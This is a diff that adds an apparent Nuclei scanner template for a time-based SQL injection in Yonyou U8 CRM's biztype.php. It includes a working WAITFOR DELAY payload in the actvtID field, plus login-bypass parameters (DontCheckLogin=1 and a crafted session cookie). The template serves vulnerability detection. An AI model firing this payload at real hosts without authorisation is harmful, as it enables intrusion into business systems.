@@ -1,0 +1,43 @@
+id: youyouU8-CRM-biztype-sqli
+
+info:
+  name: 用友U8 CRM biztype.php SQL注入漏洞
+  author: youyouU8
+  severity: high
+  tags: youyouU8
+
+http:
+  - raw:
+      - |
+        POST /activity/biztype.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=bgsesstimeout-;
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+
+        DontCheckLogin=1&actvtID=1
+
+      - |
+        POST /activity/biztype.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=bgsesstimeout-;
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+
+        DontCheckLogin=1&actvtID=1%27;WAITFOR DELAY '0:0:4'--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - 'duration_2 >= 4'
+          - 'duration_1 < 2'
+          - 'duration_2 < 10'
+        condition: and
+      - type: word
+        part: body
+        words:
+          - "[]"
